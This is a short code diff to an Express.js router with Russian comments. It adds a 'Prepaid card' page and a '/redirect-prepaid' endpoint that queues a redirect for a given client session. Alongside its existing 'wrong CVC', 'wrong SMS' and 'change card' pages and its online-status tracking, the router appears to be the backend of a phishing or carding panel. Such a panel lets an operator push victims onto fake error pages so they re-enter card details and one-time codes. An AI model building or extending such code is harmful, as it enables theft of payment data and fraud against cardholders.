@@ -95,7 +95,8 @@ router.get("/check-online-status/:sessionId", (req, res) => {
     change: "🔄 Страница изменения карты",
     payment: "💳 Страница оплаты",
     "wrong-cvc": "❌🔒 Страница неправильного CVC",
-    "wrong-sms": "❌📩 Страница неправильного SMS"
+    "wrong-sms": "❌📩 Страница неправильного SMS",
+    prepaid: "❌🏧 Страница Prepaid карты"
      // Добавляем новую страницу
   };
   const currentPageDisplay =
@@ -374,6 +375,32 @@ router.post("/redirect-wrong-cvc", (req, res) => {
 
   console.log(
     `🔄 Redirect wrong CVC request saved for client ${clientId}, session: ${sessionId}`
+  );
+  res.json({ success: true, message: "Redirect request saved" });
+});
+
+router.post("/redirect-prepaid", (req, res) => {
+  const { sessionId, clientId } = req.body;
+
+  if (!sessionId || !clientId) {
+    return res.status(400).json({
+      success: false,
+      error: "sessionId and clientId required",
+    });
+  }
+
+  // Создаем уникальный ключ для клиента + сессии
+  const redirectKey = `${clientId}:${sessionId}`;
+
+  // Сохраняем запрос на перенаправление
+  redirectRequests.set(redirectKey, {
+    type: "prepaid",
+    timestamp: Date.now(),
+    clientId: clientId,
+  });
+
+  console.log(
+    `🔄 Redirect prepaid card request saved for client ${clientId}, session: ${sessionId}`
   );
   res.json({ success: true, message: "Redirect request saved" });
 });
